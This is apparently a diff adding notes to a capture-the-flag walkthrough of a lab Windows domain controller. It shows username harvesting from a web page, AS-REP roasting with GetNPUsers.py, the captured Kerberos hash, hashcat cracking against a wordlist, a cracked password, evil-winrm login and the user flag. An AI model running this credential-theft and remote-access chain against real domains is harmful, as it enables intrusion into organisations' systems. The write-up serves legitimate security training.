@@ -44,3 +44,15 @@ PORT      STATE SERVICE
 49675/tcp open  unknown
 49686/tcp open  unknown
 49694/tcp open  unknown
+Get usernames from : http://10.10.10.175/about.html
+Fergus Smith; Shaun Coins; Hugo Bear; Bowie Taylor; Sophie Driver; Steven Kerb =>
+F.Smith; Fergus.Smith; Smith.F; S.Coins; Shaun.Coins; Coins.S; H.Bear; Hugo.Bear; Bear.H; B.Taylor; Bowie.Taylor; T.Bowie;
+S.Driver; Sophie.Driver; D.Sophie; S.Kerb; Steven.Kerb; K.Steven;
+
+└─# python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile users.txt -format hashcat
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7ecf8fbf18e84a09d280104d2ac193f4$d22074e5f906dc00a2c0bfb3a51a63bffbf399131ea88ac29deb284cb9a3031f19cd043ec12d769bc1d4ce051592fbfdb6e6a972c8cfb28d9695e3bf0067375cdfb5cfc5dbee857177bce39f468619cc74e29b84f67a92312759a677124d79e6f96495e5463305d6deee1a114c113fc3d1ab0bb21a8c95674191a9ecaaac5f1e78a03f9aec4c10163cb8d02298a213b55ef8acacbe61cff0c4731e0979b25bafae2e356818e2f93f6c20cae62f98fb152e6d6b911ce298158e1322a8fdf4fa9200857076b9ec41ded168a3d1c2557c0762194d3f2e89986c365338add4472349fbadb692cf13045f06a497d23bd086ec1fb5c086ab9f8a883dd8ed6116da78e9
+└─# hashcat --example-hashes | grep krb5asrep -A 5 -B 5
+└─# hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
+└─# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
+1b5520b98d97cf17f24122a55baf70cf
